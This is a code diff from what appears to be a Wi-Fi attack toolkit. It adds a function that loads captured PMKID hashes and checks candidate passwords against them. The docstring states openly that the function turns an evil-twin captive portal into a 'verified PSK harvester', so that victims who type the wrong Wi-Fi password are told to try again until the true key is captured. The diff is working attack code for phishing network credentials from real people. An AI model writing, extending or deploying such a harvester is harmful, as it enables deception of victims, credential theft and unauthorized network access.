@@ -300,6 +300,45 @@ def crack_pmkid_pure(
     return None
 
 
+def make_pmkid_verifier(hash_file: str):
+    """
+    Build a ``verify(password) -> bool`` closure from the PMKIDs in *hash_file*,
+    or ``None`` if the file has none. This is what turns an evil-twin captive
+    portal from a blind credential logger into a **verified PSK harvester**: a
+    password a victim types is confirmed against the real capture in
+    microseconds, so "wrong password, try again" is genuine and a success means
+    the true key was captured.
+    """
+    from modules import wpacrypto
+
+    try:
+        with open(hash_file, "r", errors="replace") as fh:
+            records = [r for r in (parse_hc22000_line(l) for l in fh)
+                       if r and r["type"] == TYPE_PMKID]
+    except OSError:
+        return None
+    if not records:
+        return None
+
+    def verify(password: str) -> bool:
+        if not password or not (8 <= len(password) <= 63):
+            return False
+        cache: dict[str, bytes] = {}
+        for rec in records:
+            essid = rec["essid"]
+            if essid not in cache:
+                cache[essid] = wpacrypto.pmk(password, essid)
+            got = wpacrypto.compute_pmkid(cache[essid], rec["bssid"], rec["station"])
+            try:
+                if got == bytes.fromhex(rec["key"]):
+                    return True
+            except ValueError:
+                continue
+        return False
+
+    return verify
+
+
 def crack_pmkid_hashcat(
     hash_file: str,
     wordlist: str,
